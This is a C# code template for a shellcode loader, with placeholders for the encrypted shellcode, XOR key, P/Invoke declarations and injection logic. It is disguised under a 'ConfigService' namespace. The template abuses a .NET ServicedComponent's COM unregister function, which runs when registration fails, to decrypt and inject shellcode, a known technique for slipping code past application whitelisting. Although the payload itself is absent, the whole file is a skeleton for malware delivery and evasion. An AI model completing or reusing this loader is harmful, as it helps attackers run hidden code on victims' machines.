using System;
using System.Security.Cryptography;
using System.EnterpriseServices;
using System.Runtime.InteropServices;


namespace ConfigService
{

    public class Component : ServicedComponent
    {
        
        {pinvoke_code}

        public Component() { }

        [ComUnregisterFunction] //This executes if registration fails
        public static void UnRegisterClass(string key)
        {
            // Shellcode
            {encrypted_shellcode}

            // Decrypt shellcode
            int i = 0;
            while (i < buf.Length)
            {
                buf[i] = (byte)(buf[i] ^ {xor_key});
                i++;
            }
            
            {injection_logic}

        }

    }

}